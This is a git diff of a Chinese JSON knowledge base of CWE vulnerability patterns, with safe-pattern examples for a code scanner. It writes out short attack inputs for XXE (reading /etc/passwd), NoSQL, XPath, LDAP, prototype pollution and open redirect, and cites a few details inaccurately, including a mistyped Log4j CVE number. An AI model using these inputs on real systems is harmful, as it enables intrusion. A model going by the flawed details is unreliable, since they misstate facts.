@@ -21,7 +21,7 @@
   },
   {
     "id": "sqli_second_order",
-    "document": "SQL注入 - 二阶注入（CWE-89）：用户输入先安全存入数据库（参数化插入），但后续查询时从数据库取出后拼接进新的 SQL，导致注入。典型场景：注册时用户名安全存入，登录后 'SELECT * FROM log WHERE user = \"' + db_user.username + \"\"' 拼接查询。防御：即使数据来自自己数据库，二次查询时仍需参数化，因为数据库内容可能被污染。",
+    "document": "SQL注入 - 二阶注入（CWE-89）：用户输入先安全存入数据库（参数化插入），但后续查询时从数据库取出后拼接进新的 SQL，导致注入。典型场景：注册时用户名安全存入，登录后 \"SELECT * FROM log WHERE user = '\" + db_user.username + \"'\" 拼接查询。防御：即使数据来自自己数据库，二次查询时仍需参数化，因为数据库内容可能被污染。",
     "metadata": {"type": "SQL注入", "cwe": "CWE-89", "category": "注入类"}
   },
   {
@@ -56,17 +56,17 @@
   },
   {
     "id": "cmdi_eval_exec",
-    "document": "命令注入 - eval/exec 动态执行（CWE-95/78）：eval() 和 exec() 把字符串当代码执行，用户输入一旦进入即 RCE。典型漏洞：eval(request.args.get('expr'))、exec('result = ' + user_formula)、__import__('os').system(user_input)。判断要点：eval/exec/input 作为 Sink 且参数含用户可控数据。修复：禁止 eval/exec 用户输入；需要表达式求值用 ast.literal_eval()（只解析字面量）；需要计算用安全的表达式解析库。",
-    "metadata": {"type": "命令注入", "cwe": "CWE-78", "category": "注入类"}
+    "document": "代码注入 - eval/exec 动态执行（CWE-94/95）：eval() 和 exec() 把字符串当代码执行，用户输入一旦进入即 RCE。典型漏洞：eval(request.args.get('expr'))、exec('result = ' + user_formula)、__import__('os').system(user_input)。判断要点：eval/exec/input 作为 Sink 且参数含用户可控数据。注意：eval/exec 属于代码注入（CWE-94），与命令注入（CWE-78，os.system/subprocess shell=True）属于不同 CWE，但常被并列讨论。修复：禁止 eval/exec 用户输入；需要表达式求值用 ast.literal_eval()（只解析字面量）；需要计算用安全的表达式解析库。",
+    "metadata": {"type": "代码注入", "cwe": "CWE-94", "category": "注入类"}
   },
   {
     "id": "cmdi_safe_pattern",
-    "document": "命令注入 - 安全模式识别（CWE-78）：以下写法是安全的，不应误报：subprocess.run(['ls', '-l', filename], check=True)（列表参数 + shell 默认 False）、subprocess.run(['grep', pattern], input=data)（输入通过 stdin）、shlex.quote(filename) 对拼接场景的转义、subprocess.run(['ping', '-c', '1', host], capture_output=True, timeout=5) 配合 host.isalnum() 白名单校验。判断要点：参数列表形式且未启用 shell 时，即使用户输入作为参数也是安全的（操作系统不会解释元字符）；输入白名单校验（isalnum / 正则）后进入命令参数也是安全的。常见误报：看到 subprocess 就报警，但忽略 shell=False、列表形式与输入校验。安全写法示例：if not host.replace('.', '').replace('-', '').isalnum(): return 'invalid'; subprocess.run(['ping', '-c', '1', host], capture_output=True, timeout=5) → has_vulnerability=false。",
+    "document": "命令注入 - 安全模式识别（CWE-78）：以下写法是安全的，不应误报：subprocess.run(['git', 'log', '--oneline'], check=True)（列表参数 + shell 默认 False）、subprocess.run(['grep', '-r', pattern, '/var/log'], input=data)（输入通过 stdin）、shlex.quote(filename) 对拼接场景的转义、subprocess.run(['nslookup', domain], capture_output=True, timeout=5) 配合 domain.isalnum() 白名单校验。判断要点：参数列表形式且未启用 shell 时，即使用户输入作为参数也是安全的（操作系统不会解释元字符）；输入白名单校验（isalnum / 正则）后进入命令参数也是安全的。常见误报：看到 subprocess 就报警，但忽略 shell=False、列表形式与输入校验。安全写法示例：if not domain.replace('.', '').replace('-', '').isalnum(): return 'invalid'; subprocess.run(['nslookup', domain], capture_output=True, timeout=5) → has_vulnerability=false。",
     "metadata": {"type": "命令注入", "cwe": "CWE-78", "category": "注入类", "safe_pattern": true}
   },
   {
     "id": "sqli_safe_pattern",
-    "document": "SQL注入 - 安全模式识别（CWE-89）：以下写法是安全的，不应误报：cursor.execute('SELECT * FROM users WHERE username = ? AND password = ?', (username, password))（参数化查询，? 占位符 + 参数元组）、cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))（PostgreSQL psycopg2 风格 %s 占位符）、Django Model.objects.filter(name=q)（ORM 查询构造器）、SQLAlchemy session.query(User).filter_by(name=q)（ORM 查询）。判断要点：SQL 语句使用占位符（? / %s / :name）且参数以元组/dict 形式独立传入，数据库驱动会自动转义，用户输入不会进入 SQL 语法层。常见误报：把 cursor.execute(query, (username, password)) 这种已经是参数化查询的代码当成漏洞，又在 fix_suggestion 中推荐 cursor.execute('SELECT ... WHERE username = ? AND password = ?', (username, password)) 这种与原代码等价的写法。安全写法示例：query = 'SELECT * FROM users WHERE username = ? AND password = ?'; cursor.execute(query, (username, password)) → has_vulnerability=false。",
+    "document": "SQL注入 - 安全模式识别（CWE-89）：以下写法是安全的，不应误报：cursor.execute('SELECT id, email FROM accounts WHERE email = ? AND status = ?', (email, status))（参数化查询，? 占位符 + 参数元组）、cursor.execute('SELECT name FROM products WHERE sku = %s', (sku,))（PostgreSQL psycopg2 风格 %s 占位符）、Django Model.objects.filter(name=q)（ORM 查询构造器）、SQLAlchemy session.query(User).filter_by(name=q)（ORM 查询）。判断要点：SQL 语句使用占位符（? / %s / :name）且参数以元组/dict 形式独立传入，数据库驱动会自动转义，用户输入不会进入 SQL 语法层。常见误报：把 cursor.execute(query, (param1, param2)) 这种已经是参数化查询的代码当成漏洞，又在 fix_suggestion 中推荐与原代码等价的写法。安全写法示例：query = 'SELECT id, email FROM accounts WHERE email = ? AND status = ?'; cursor.execute(query, (email, status)) → has_vulnerability=false。",
     "metadata": {"type": "SQL注入", "cwe": "CWE-89", "category": "注入类", "safe_pattern": true}
   },
   {
@@ -76,7 +76,7 @@
   },
   {
     "id": "path_safe_pattern_strict",
-    "document": "路径穿越 - 严格安全模式（CWE-22）：以下写法是安全的，不应误报：base = os.path.abspath('/app/data'); full = os.path.abspath(os.path.join(base, filename)); if not full.startswith(base + os.sep): abort(403)（abspath 规范化 + startswith 校验）、if filename not in ALLOWED_FILES: abort(403)（白名单文件名集合）、werkzeug.utils.secure_filename(filename)（Flask 安全文件名）。判断要点：os.path.abspath 会解析所有 .. 序列得到绝对路径，startswith(base + os.sep) 校验确保最终路径在允许目录内；白名单文件名集合直接拒绝任何非预期文件名。常见误报：把 abspath+startswith 校验后的 open(full) 当成漏洞。安全写法示例：base = os.path.abspath('/app/data'); full = os.path.abspath(os.path.join(base, filename)); if not full.startswith(base + os.sep): abort(403); return open(full).read() → has_vulnerability=false。",
+    "document": "路径穿越 - 严格安全模式（CWE-22）：以下写法是安全的，不应误报：base = os.path.abspath('/srv/storage'); full = os.path.abspath(os.path.join(base, user_file)); if not full.startswith(base + os.sep): abort(403)（abspath 规范化 + startswith 校验）、if filename not in ALLOWED_FILES: abort(403)（白名单文件名集合）、werkzeug.utils.secure_filename(filename)（Flask 安全文件名）。判断要点：os.path.abspath 会解析所有 .. 序列得到绝对路径，startswith(base + os.sep) 校验确保最终路径在允许目录内；白名单文件名集合直接拒绝任何非预期文件名。常见误报：把 abspath+startswith 校验后的 open(full) 当成漏洞。安全写法示例：base = os.path.abspath('/srv/storage'); full = os.path.abspath(os.path.join(base, user_file)); if not full.startswith(base + os.sep): abort(403); return open(full).read() → has_vulnerability=false。",
     "metadata": {"type": "路径穿越", "cwe": "CWE-22", "category": "访问控制", "safe_pattern": true}
   },
   {
@@ -97,7 +97,7 @@
   {
     "id": "pathtraversal_safe_pattern",
     "document": "路径遍历 - 语义识别要点（CWE-22）：典型漏洞特征：full_path = '/app/data/' + filename（字符串拼接用户输入到路径）、open(request.args.get('file'))（直接打开用户输入）、os.path.join(base, user_input)（join 不会防御绝对路径覆盖）。判断要点：用户输入到达 open/read/write/os.remove 等文件操作 Sink，且中间无 abspath+startswith 校验。安全写法：base = os.path.abspath('/app/data/'); full = os.path.abspath(os.path.join(base, filename)); if not full.startswith(base + os.sep): abort(403)。",
-    "metadata": {"type": "路径遍历", "cwe": "CWE-22", "category": "访问控制"}
+    "metadata": {"type": "路径遍历", "cwe": "CWE-22", "category": "访问控制", "safe_pattern": true}
   },
   {
     "id": "pathtraversal_encoding",
@@ -111,7 +111,7 @@
   },
   {
     "id": "hardcoded_patterns",
-    "document": "硬编码凭证 - 常见模式（CWE-798）：典型危险代码：API_KEY = 'sk-1234567890abcdef'、password = 'admin123'、AWS_SECRET_ACCESS_KEY = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCY'、token = 'Bearer eyJhbGc...'、conn = 'mysql://root:password@host/db'。判断要点：变量名含 key/secret/password/token/credential/passphrase，且赋值为字符串字面量。Java 场景：private String DB_PASSWORD = '123456'、System.setProperty('aws.secret', '...')。修复：从环境变量 os.environ['API_KEY']、配置文件（不入库）、KMS 读取。",
+    "document": "硬编码凭证 - 常见模式（CWE-798）：典型危险代码：API_KEY = 'sk-1234567890abcdef'、password = 'admin123'、AWS_SECRET_ACCESS_KEY = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCY'、token = 'Bearer eyJhbGc...'、conn = 'mysql://root:password@host/db'。判断要点：变量名含 key/secret/password/token/credential/passphrase，且赋值为字符串字面量。Java 场景：private String DB_PASSWORD = \"123456\"、System.setProperty(\"aws.secret\", \"...\")。修复：从环境变量 os.environ['API_KEY']、配置文件（不入库）、KMS 读取。",
     "metadata": {"type": "硬编码凭证", "cwe": "CWE-798", "category": "敏感数据"}
   },
   {
@@ -162,7 +162,7 @@
   {
     "id": "idor_safe_pattern",
     "document": "IDOR - 安全模式识别（CWE-639）：典型漏洞：user = User.objects.get(id=request.args.get('id'))（未校验当前用户是否有权访问）。安全写法：user = User.objects.get(id=request.args.get('id')); if user.id != current_user.id and not current_user.is_admin: abort(403)。判断要点：从用户可控参数（id/uid/doc_id）直接查询对象，且后续无权限校验。修复：每个对象查询后校验所有权；用 current_user 关联查询（User.objects.filter(owner=current_user)）；用 UUID 增加枚举难度。",
-    "metadata": {"type": "不安全的直接对象引用", "cwe": "CWE-639", "category": "访问控制"}
+    "metadata": {"type": "不安全的直接对象引用", "cwe": "CWE-639", "category": "访问控制", "safe_pattern": true}
   },
   {
     "id": "misconfig_knowledge",
@@ -181,7 +181,7 @@
   },
   {
     "id": "xxe_knowledge",
-    "document": "XML 外部实体注入 XXE（CWE-611）：XML 解析器解析外部实体导致文件读取/SSRF/RCE。典型漏洞：from xml.etree import ElementTree; tree = ElementTree.fromstring(user_xml)（默认解析实体）；Java DocumentBuilderFactory 未禁用外部实体。攻击 payload：<!ENTITY xxe SYSTEM 'file:///etc/passwd'>。判断要点：用户 XML 进入解析器，且解析器未显式禁用外部实体。修复：Python 用 defusedxml 替代标准库；Java 设置 factory.setFeature('http://apache.org/xml/features/disallow-doctype-decl', true)。",
+    "document": "XML 外部实体注入 XXE（CWE-611）：XML 解析器解析外部实体导致文件读取/SSRF/RCE。注意区分解析器：Python 标准库 xml.etree.ElementTree 默认不解析外部实体（本身安全）；lxml.etree.fromstring 默认解析外部实体（有 XXE 风险）；Java DocumentBuilderFactory 默认未禁用外部实体（有风险）。典型漏洞：from lxml import etree; tree = etree.fromstring(user_xml)（lxml 默认解析实体）；Java DocumentBuilderFactory 未禁用外部实体。攻击 payload：<!ENTITY xxe SYSTEM 'file:///etc/passwd'>。判断要点：用户 XML 进入会解析外部实体的解析器（lxml.etree、Java DocumentBuilderFactory、PHP xml_parse），且未显式禁用外部实体。修复：Python 用 defusedxml 替代标准库；Java 设置 factory.setFeature('http://apache.org/xml/features/disallow-doctype-decl', true)。",
     "metadata": {"type": "XXE", "cwe": "CWE-611", "category": "注入类"}
   },
   {
@@ -193,5 +193,170 @@
     "id": "logging_insufficient",
     "document": "日志监控不足（CWE-778）：安全事件未被记录或日志本身泄露敏感信息。漏洞场景：登录失败不记录、关键操作无审计日志、日志中打印密码/token（logger.info(f'login with password={password}')）。判断要点：敏感操作（登录/权限变更/数据删除/支付）无日志记录，或日志含 password/secret/token 字段。修复：记录关键操作的 user/ip/time/action；日志脱敏（password → ***）；日志独立存储防篡改。",
     "metadata": {"type": "日志监控不足", "cwe": "CWE-778", "category": "日志审计"}
+  },
+  {
+    "id": "log_injection",
+    "document": "日志注入（CWE-117）：用户输入未经过滤写入日志文件，攻击者可注入换行符 \\n \\r 伪造日志条目、掩盖攻击痕迹。典型漏洞：logger.info(f'Login from user: {username}')（用户输入含 \\n 即可换行伪造日志）。判断要点：用户输入进入 logger.info/debug/error 等日志 Sink，且未过滤换行符与控制字符。修复：白名单字符过滤（仅允许 [a-zA-Z0-9_@.\\-]），或转义 \\n \\r \\t。注意：Log4j JNDI 注入（CVE-2021-4428）属于反序列化/JNDI 注入（CWE-502/917），不是 CWE-117 日志注入，需单独修复（升级 Log4j 至 2.15+ 或禁用 JNDI lookup）。",
+    "metadata": {"type": "日志注入", "cwe": "CWE-117", "category": "日志审计"}
+  },
+  {
+    "id": "missing_authentication",
+    "document": "认证缺失（CWE-306）：敏感操作接口未校验用户登录状态，任何人可直接访问。典型漏洞：@app.route('/admin/delete_user', methods=['POST'])\\ndef delete_user(): user_id = request.args.get('user_id'); ...（无 session 校验）。判断要点：路由执行敏感操作（删除/修改/导出/支付）但函数体内未检查 session['user_id'] / request.user / @login_required。修复：所有敏感路由入口加登录校验，或用装饰器统一拦截。",
+    "metadata": {"type": "认证缺失", "cwe": "CWE-306", "category": "会话管理"}
+  },
+  {
+    "id": "missing_authorization",
+    "document": "缺失授权（CWE-862）：接口校验了登录但未校验角色，普通用户可调用管理员接口。典型漏洞：if 'user_id' not in session: return 401; return export_all_users()（未检查 role == 'admin'）。判断要点：接口仅校验登录（session['user_id']）但未校验角色/权限（role / permission / is_admin），普通用户可访问管理功能。修复：登录校验后追加角色校验 if session.get('role') != 'admin': return 403；或用 RBAC 框架。",
+    "metadata": {"type": "缺失授权", "cwe": "CWE-862", "category": "访问控制"}
+  },
+  {
+    "id": "authz_safe_pattern",
+    "document": "认证授权 - 安全模式识别（CWE-306/862/639）：以下写法是安全的，不应误报：if 'user_id' not in session: return 401; if not is_admin(session['user_id']): return 403（双重校验：登录 + 角色）、@login_required 装饰器、@requires_roles('admin') 装饰器、if user.id != current_user.id: abort(403)（IDOR 防护）。判断要点：接口同时校验登录状态与角色/所有权，即安全。常见误报：把 is_admin() 校验后的 /admin/ 路由当成未授权接口。安全写法示例：def export():\\n  if 'user_id' not in session: abort(401)\\n  if not is_admin(session['user_id']): abort(403)\\n  return 'data' → has_vulnerability=false。",
+    "metadata": {"type": "认证授权", "cwe": "CWE-862", "category": "访问控制", "safe_pattern": true}
+  },
+  {
+    "id": "session_fixation",
+    "document": "会话固定（CWE-384）：登录成功后未重新生成 session id，攻击者可预设 session id 诱导受害者登录后复用。典型漏洞：session['user_id'] = username; return 'Login success'（沿用客户端传来的 session id）。判断要点：登录成功后直接给 session 赋值，未调用 session.clear() / session.regenerate() / session.cycle_key()。修复：登录成功后先 session.clear() 再赋值，或用 Flask session.regenerate()、Django logout_then_login。",
+    "metadata": {"type": "会话固定", "cwe": "CWE-384", "category": "会话管理"}
+  },
+  {
+    "id": "session_safe_pattern",
+    "document": "会话管理 - 安全模式识别（CWE-384）：以下写法是安全的，不应误报：session.clear(); session['user_id'] = username; session.modified = True（登录后清空旧 session 再赋值）、Flask session.regenerate()、Django logout(request) + login(request, user)。判断要点：登录成功后会话 id 被重新生成（旧 session 失效），即安全。常见误报：看到 session['user_id'] = username 就报会话固定，但忽略了前面的 session.clear()。安全写法示例：session.clear();\\n session['user_id'] = username\\n session.modified = True → has_vulnerability=false。",
+    "metadata": {"type": "会话管理", "cwe": "CWE-384", "category": "会话管理", "safe_pattern": true}
+  },
+  {
+    "id": "weak_crypto_md5",
+    "document": "弱加密算法（CWE-327）：使用 MD5/SHA1 等已被破解的哈希算法存储密码或做完整性校验。典型漏洞：hashed = hashlib.md5(password.encode()).hexdigest()（无 salt 无迭代，彩虹表秒破）、hashlib.sha1(password).hexdigest()、hashlib.md5(file_data).hexdigest() 做完整性。判断要点：密码/敏感数据用 md5/sha1 哈希；MD5 已被证明可在分钟内碰撞。修复：密码用 bcrypt.hashpw(password, bcrypt.gensalt(rounds=12))；完整性用 SHA-256+；签名用 HMAC-SHA256。",
+    "metadata": {"type": "弱加密", "cwe": "CWE-327", "category": "加密"}
+  },
+  {
+    "id": "hardcoded_iv",
+    "document": "硬编码 IV + 静态密钥（CWE-329/798）：AES-CBC 等模式使用固定 IV 与硬编码 key，破坏语义安全（同明文 → 同密文，可识别模式）。典型漏洞：SECRET_KEY = b'hardcoded_32_byte_key'; STATIC_IV = b'fixed_iv_16'; cipher = AES.new(SECRET_KEY, MODE_CBC, STATIC_IV)。判断要点：加密用到硬编码 key 或固定 IV；CBC/CTR/GCM 模式重用 IV 是致命错误。修复：key 从 KMS/环境变量读取；IV 每次随机生成（os.urandom(16)）并随密文一起存储。",
+    "metadata": {"type": "硬编码 IV", "cwe": "CWE-329", "category": "加密"}
+  },
+  {
+    "id": "weak_random",
+    "document": "不安全随机数（CWE-330）：用 random 模块生成密码重置 token / 会话 id / API key 等安全敏感值。random 是基于种子的伪随机，可被预测。典型漏洞：token = ''.join(random.choices(string.ascii_letters + string.digits, k=16))。判断要点：安全敏感值（token/key/id/session）用 random 模块生成。修复：用 secrets.token_urlsafe(32) / secrets.token_hex(32)，这是密码学安全随机。",
+    "metadata": {"type": "弱随机", "cwe": "CWE-330", "category": "加密"}
+  },
+  {
+    "id": "crypto_safe_pattern",
+    "document": "加密 - 安全模式识别（CWE-327/329/330）：以下写法是安全的，不应误报：bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))（自适应 salt + cost）、secrets.token_urlsafe(32)（密码学安全随机）、cryptography.fernet.Fernet.generate_key()（每次新 key）、AES.new(key, MODE_GCM, nonce=os.urandom(12))（随机 nonce）。判断要点：密码用 bcrypt/argon2/scrypt；token 用 secrets 模块；对称加密 IV/nonce 每次随机。常见误报：把 bcrypt.hashpw 当成弱哈希；把 secrets.token_urlsafe 当成 random。安全写法示例：hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12)) → has_vulnerability=false。",
+    "metadata": {"type": "加密", "cwe": "CWE-327", "category": "加密", "safe_pattern": true}
+  },
+  {
+    "id": "insecure_tls",
+    "document": "不安全 TLS（CWE-295）：调用外部 API 时关闭证书校验，可被中间人攻击。典型漏洞：requests.get(url, verify=False)、urllib3.disable_warnings() + verify=False、ssl._create_unverified_context()。判断要点：HTTP 客户端显式 verify=False 或禁用 SSL 校验。修复：保持 verify=True（默认）；自签证书显式指定 CA bundle：requests.get(url, verify='/path/to/ca.pem')。",
+    "metadata": {"type": "不安全 TLS", "cwe": "CWE-295", "category": "加密"}
+  },
+  {
+    "id": "xxe_safe_pattern",
+    "document": "XXE - 安全模式识别（CWE-611）：以下写法是安全的，不应误报：parser = etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False)（显式禁用外部实体）、defusedxml.ElementTree.fromstring(xml)、Java DocumentBuilderFactory factory.setFeature('http://apache.org/xml/features/disallow-doctype-decl', true)、Java SAXParserFactory factory.setValidating(false)。判断要点：XML 解析器显式禁用外部实体与 DTD，即安全。常见误报：看到 etree.fromstring 就报 XXE，但忽略了 XMLParser(resolve_entities=False) 的显式禁用。安全写法示例：parser = etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False); root = etree.fromstring(raw, parser=parser) → has_vulnerability=false。",
+    "metadata": {"type": "XXE", "cwe": "CWE-611", "category": "注入类", "safe_pattern": true}
+  },
+  {
+    "id": "csrf_safe_pattern",
+    "document": "CSRF - 安全模式识别（CWE-352）：以下写法是安全的，不应误报：表单含 <input type='hidden' name='csrf_token' value='{{ csrf_token() }}'>，服务端校验 token = request.form.get('csrf_token'); if token != session.get('csrf_token'): return 403、Flask-SeaSurf / Django CsrfViewMiddleware 中间件、Cookie SameSite=Strict/Lax、Origin/Referer 头严格校验（urlsplit 后比较 netloc）。判断要点：表单有 CSRF token 且服务端校验，或框架中间件统一处理。常见误报：把有 token 校验的接口当成 CSRF 漏洞。安全写法示例：token = request.form.get('csrf_token', '')\\n if not token or token != session.get('csrf_token'):\\n     return 'Invalid CSRF token', 403 → has_vulnerability=false。",
+    "metadata": {"type": "CSRF", "cwe": "CWE-352", "category": "会话管理", "safe_pattern": true}
+  },
+  {
+    "id": "ssti",
+    "document": "服务端模板注入 SSTI（CWE-1336）：用户输入直接拼接到模板字符串中并渲染，可执行任意表达式 RCE。典型漏洞：template_str = f'<h1>Hello {name}</h1>'; env.from_string(template_str).render()（用户输入进入模板字符串）、Jinja2 Environment.from_string(user_input)、Velocity.evaluate(user_input)、Freemarker template.process(user_input)。判断要点：用户输入与模板字符串拼接（f-string / + / format）后调用 from_string / Template()。修复：模板字符串固定，用户输入通过 render(name=name) 变量注入；启用 Jinja2 autoescape=SandboxedEnvironment。",
+    "metadata": {"type": "SSTI", "cwe": "CWE-1336", "category": "注入类"}
+  },
+  {
+    "id": "ssti_safe_pattern",
+    "document": "SSTI - 安全模式识别（CWE-1336）：以下写法是安全的，不应误报：env.from_string('<h1>Hello {{ name }}</h1>').render(name=user_input)（用户输入作为变量值传入，不是模板表达式的一部分）、Jinja2 autoescape=True、SandboxedEnvironment。判断要点：模板字符串中没有用户输入的拼接，用户输入仅作为 render() 的参数；{{ }} 占位符是固定字符串，攻击者无法注入表达式。常见误报：把 render(name=user_input) 当成 SSTI，但 name 只是变量值不会被求值。安全写法示例：template = env.from_string('<h1>{{ name }}</h1>')\\n return template.render(name=name) → has_vulnerability=false。",
+    "metadata": {"type": "SSTI", "cwe": "CWE-1336", "category": "注入类", "safe_pattern": true}
+  },
+  {
+    "id": "ldap_injection",
+    "document": "LDAP 注入（CWE-90）：用户输入直接拼接到 LDAP 过滤器，可绕过认证或泄露目录。典型漏洞：filter_str = f'(uid={username})'; conn.search_s(base, scope, filter_str)（攻击者输入 *)(uid=*) 可泄露所有用户）、Java DirContext.search(filter, new Object[]{username}) 拼接。判断要点：LDAP 过滤器字符串含用户输入拼接。修复：用 escape_filter_chars(username) 转义 * ( ) \\ ; 等元字符；或用参数化查询 filter_expr='(uid=%s)' + ctx.search_s(base, scope, filter_expr, [username])。",
+    "metadata": {"type": "LDAP 注入", "cwe": "CWE-90", "category": "注入类"}
+  },
+  {
+    "id": "nosql_injection",
+    "document": "NoSQL 注入（CWE-943）：MongoDB 等 NoSQL 查询直接用用户输入，攻击者可注入 $ne/$gt/$regex 等操作符绕过条件。典型漏洞：db.users.find_one({'username': username, 'password': password})（攻击者 POST password[$ne]=1，表单解析为 {'$ne': '1'}，匹配所有非空密码）。判断要点：用户输入直接进入 NoSQL 查询条件字典，未做类型强制与操作符过滤。修复：强制类型转换 str(username) / int(user_id)；禁用 $ 开头的键；用 schema 校验请求体。",
+    "metadata": {"type": "NoSQL 注入", "cwe": "CWE-943", "category": "注入类"}
+  },
+  {
+    "id": "xpath_injection",
+    "document": "XPath 注入（CWE-643）：用户输入直接拼接到 XPath 表达式，可绕过认证。典型漏洞：xpath = f\"//user[username='{username}' and password='{password}']\"; tree.xpath(xpath)（攻击者输入 ' or '1'='1 绕过）。判断要点：XPath 字符串含用户输入拼接。修复：用 lxml.etree.xpath() 配合变量：tree.xpath('//user[username=$u and password=$p]', u=username, p=password)；或对单引号做转义。",
+    "metadata": {"type": "XPath 注入", "cwe": "CWE-643", "category": "注入类"}
+  },
+  {
+    "id": "code_injection_eval",
+    "document": "代码注入（CWE-94）：eval/exec 把字符串当代码执行，用户输入进入即 RCE。典型漏洞：eval(request.args.get('expr'))、exec('result = ' + user_formula)、Java SpEL parser.parseExpression(user_input).getValue()、Java OGNL Ognl.getValue(user_input, ctx)、Groovy GroovyShell.evaluate(user_input)。判断要点：eval/exec/SpEL/OGNL/Groovy 等求值 Sink 的参数含用户输入。修复：禁用 eval/exec 用户输入；表达式用 ast.literal_eval（仅字面量）；SpEL 用 SimpleEvaluationContext 限制；OGNL 禁用成员访问。",
+    "metadata": {"type": "代码注入", "cwe": "CWE-94", "category": "注入类"}
+  },
+  {
+    "id": "open_redirect",
+    "document": "开放重定向（CWE-601）：用户输入 URL 直接作为重定向目标，可被用于钓鱼。典型漏洞：return redirect(request.args.get('next'))（无校验）、if next_url.startswith('/'): return redirect(next_url)（//evil.com 也满足 startswith('/')，浏览器解释为协议相对 URL 跳转）。判断要点：用户输入进入 redirect()/HttpResponseRedirect()，校验不严。修复：用 urlsplit 解析后判断 netloc 是否为空（站内）且 scheme 为空/相对；或用白名单域名。",
+    "metadata": {"type": "开放重定向", "cwe": "CWE-601", "category": "访问控制"}
+  },
+  {
+    "id": "race_condition",
+    "document": "竞态条件 / TOCTOU（CWE-362）：检查与使用之间无锁，并发可绕过检查。典型漏洞：if balances[user] >= amount: time.sleep(0.01); balances[user] -= amount（check-then-use 之间无锁，并发可双花）。判断要点：先检查条件（余额/权限/库存）再执行操作，两步之间无 threading.Lock / 事务 / SELECT FOR UPDATE。修复：with lock: 整个临界区加锁；或数据库事务 + 行锁 SELECT balance FROM accounts WHERE user_id=? FOR UPDATE。",
+    "metadata": {"type": "竞态条件", "cwe": "CWE-362", "category": "并发"}
+  },
+  {
+    "id": "integer_overflow",
+    "document": "整数溢出（CWE-190）：算术运算未限制上限，超大数相乘溢出为负数或小数。典型漏洞：total = price * quantity（未校验 quantity 上限，C/Java 中 999999999 * 100 可能溢出为负数，攻击者下单反而赚钱）。注意：Python 3 整数无溢出，但 Java/C/C++ 中 int/long 有上限。判断要点：用户输入的数值（qty/amount/count）进入算术运算，且未做范围校验。修复：1 ≤ qty ≤ 9999 白名单校验；Java 用 BigInteger 或 Math.multiplyExact 检测溢出。",
+    "metadata": {"type": "整数溢出", "cwe": "CWE-190", "category": "数值处理"}
+  },
+  {
+    "id": "mass_assignment",
+    "document": "批量赋值（CWE-915）：ORM 模型直接遍历用户 JSON 全部 setattr，攻击者可注入 is_admin=true 提权。典型漏洞：for key, value in data.items(): setattr(user, key, value)（未限制可更新字段）、Django ModelForm 含 is_admin 字段、Spring @ModelAttribute User user 直接绑定。判断要点：用户输入的 key 直接进入 setattr / ModelForm / @ModelAttribute，无白名单。修复：用白名单字段：ALLOWED = {'username', 'email'}; for k in ALLOWED & data: setattr(user, k, data[k])；Django ModelForm 用 fields = ['username', 'email']。",
+    "metadata": {"type": "批量赋值", "cwe": "CWE-915", "category": "访问控制"}
+  },
+  {
+    "id": "prototype_pollution",
+    "document": "原型链污染（CWE-1321，JS 专属）：递归 merge 用户输入到对象时未过滤 __proto__ / constructor / prototype，可污染所有对象原型。典型漏洞：function merge(target, src) { for (const key in src) { if (typeof src[key] === 'object') merge(target[key], src[key]); else target[key] = src[key]; } }；攻击者 POST {\"__proto__\": {\"isAdmin\": true}} 后所有对象的 isAdmin 都变 true。判断要点：递归 merge / extend / defaults 函数未过滤 __proto__/constructor/prototype 键。修复：if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue；或用 Object.create(null) 创建无原型的对象。",
+    "metadata": {"type": "原型链污染", "cwe": "CWE-1321", "category": "注入类"}
+  },
+  {
+    "id": "type_juggling",
+    "document": "类型杂耍（CWE-843，PHP 专属）：PHP 用 == 比较时会发生隐式类型转换。典型漏洞：if ($user_token == $expected_token)（$expected_token = '0e462...'，PHP 会把 0e 开头字符串按科学计数法转 float 0，攻击者传 '0' 即让 0 == 0 为 true）。判断要点：PHP 中用 == 比较字符串与字符串/数字，且其中一方为 0e 开头或数字字符串。修复：用 === 严格比较；或用 hash_equals($expected, $user) 防时序攻击。",
+    "metadata": {"type": "类型杂耍", "cwe": "CWE-843", "category": "会话管理"}
+  },
+  {
+    "id": "timing_attack",
+    "document": "时序攻击（CWE-208）：用 == 比较密钥/token，逐字节比较遇到不匹配立即返回，时序差异可被测量爆破。典型漏洞：if token == SECRET_API_TOKEN: return 'Admin data'（== 是短路比较，前 N 字节匹配的 token 比不匹配的响应慢几十微秒）。判断要点：敏感字符串（token/secret/password/hash）用 == 比较。修复：用 hmac.compare_digest(a, b) 或 secrets.compare_digest(a, b) 做常数时间比较。",
+    "metadata": {"type": "时序攻击", "cwe": "CWE-208", "category": "加密"}
+  },
+  {
+    "id": "jwt_confusion",
+    "document": "JWT 算法混淆 / none 绕过（CWE-347）：jwt.decode 未显式指定 algorithms，攻击者可伪造 alg=none 的 JWT 跳过签名校验，或 alg=HS256 与 RS256 混淆用公钥当 HMAC 密钥。典型漏洞：payload = jwt.decode(token, SECRET)（旧版 PyJWT 默认允许 none，已废弃；新版 PyJWT 强制要求 algorithms 参数）、jwt.decode(token, PUBLIC_KEY, algorithms=['RS256','HS256'])（同时接受两种算法，攻击者把 RS256 改 HS256 用公钥当 HMAC 密钥签名）。注意：verify=False 是完全禁用校验（任何 token 都通过），不等同于允许 none。判断要点：jwt.decode 未显式锁定 algorithms（如 algorithms=['HS256']），或同时接受 HS256 与 RS256。修复：jwt.decode(token, SECRET, algorithms=['HS256']) 显式锁定单一算法。",
+    "metadata": {"type": "JWT 混淆", "cwe": "CWE-347", "category": "会话管理"}
+  },
+  {
+    "id": "unrestricted_upload",
+    "document": "任意文件上传（CWE-434）：用户上传文件名直接用作保存路径，可上传 .py/.php/.jsp 等 webshell。典型漏洞：filename = file.filename; file.save(os.path.join(UPLOAD_DIR, filename))（未校验扩展名 + 未生成随机名 + 未过滤 ../）。判断要点：request.files / MultipartFile 的 filename 直接进入 save() / transferTo()，无白名单校验。修复：扩展名白名单（jpg/png/pdf）；生成随机文件名（uuid）；secure_filename 过滤 ../。",
+    "metadata": {"type": "任意文件上传", "cwe": "CWE-434", "category": "访问控制"}
+  },
+  {
+    "id": "cve_real_struts2_ognl",
